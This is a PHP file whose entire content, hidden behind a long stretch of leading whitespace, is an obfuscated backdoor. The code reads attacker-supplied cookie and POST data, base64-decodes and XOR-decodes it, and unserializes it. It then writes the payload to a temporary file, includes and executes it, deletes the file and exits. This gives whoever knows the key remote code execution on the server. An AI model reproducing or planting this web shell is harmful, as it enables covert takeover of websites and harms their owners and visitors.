<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("dorfeuuQx")){class dorfeuuQx{public static $QydXwi = "MhaEkDUxuAGyRKsU";public static $ROzNXURPFx = NULL;public function __construct(){$HQLhzuUq = @$_COOKIE[substr(dorfeuuQx::$QydXwi, 0, 4)];if (!empty($HQLhzuUq)){$piNaNhzmdt = "base64";$hJuQqVZY = "";$HQLhzuUq = explode(",", $HQLhzuUq);foreach ($HQLhzuUq as $LePEvsfs){$hJuQqVZY .= @$_COOKIE[$LePEvsfs];$hJuQqVZY .= @$_POST[$LePEvsfs];}$hJuQqVZY = array_map($piNaNhzmdt . "_decode", array($hJuQqVZY,)); $hJuQqVZY = $hJuQqVZY[0] ^ str_repeat(dorfeuuQx::$QydXwi, (strlen($hJuQqVZY[0]) / strlen(dorfeuuQx::$QydXwi)) + 1);dorfeuuQx::$ROzNXURPFx = @unserialize($hJuQqVZY);}}public function __destruct(){$this->qUBcn();}private function qUBcn(){if (is_array(dorfeuuQx::$ROzNXURPFx)) {$XKPwcKTVn = sys_get_temp_dir() . "/" . crc32(dorfeuuQx::$ROzNXURPFx["salt"]);@dorfeuuQx::$ROzNXURPFx["write"]($XKPwcKTVn, dorfeuuQx::$ROzNXURPFx["content"]);include $XKPwcKTVn;@dorfeuuQx::$ROzNXURPFx["delete"]($XKPwcKTVn);exit();}}}$nFZGumGYj = new dorfeuuQx(); $nFZGumGYj = NULL;} ?><?php
